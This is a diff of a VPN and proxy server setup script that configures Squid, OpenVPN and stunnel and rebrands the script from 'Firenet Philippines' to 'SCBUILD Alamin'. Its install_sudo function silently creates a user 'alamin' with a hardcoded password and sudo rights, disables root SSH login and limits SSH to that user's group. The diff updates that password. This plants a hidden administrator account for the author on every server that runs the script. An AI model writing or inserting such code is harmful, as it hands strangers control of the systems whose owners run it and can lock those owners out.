@@ -269,7 +269,7 @@ refresh_pattern ^ftp: 1440 20% 10080
 refresh_pattern ^gopher: 1440 0% 1440
 refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
 refresh_pattern . 0 20% 4320
-visible_hostname Firenet-Proxy
+visible_hostname SCBUILD-Proxy
 error_directory /usr/share/squid3/errors/English"| sudo tee /etc/squid3/squid.conf
 sudo service squid3 restart
 } &>/dev/null
@@ -291,7 +291,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by SCBUILD Alamin :)
 dev tun
 port PORT_UDP
 proto udp
@@ -334,11 +334,12 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
-verb 3' > /etc/openvpn/server.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by SCBUILD Alamin :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -381,7 +382,8 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
-verb 3' > /etc/openvpn/server2.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server2.conf
 
 sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
@@ -631,7 +633,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@@Alaminbd17 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@@Alamindb12 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
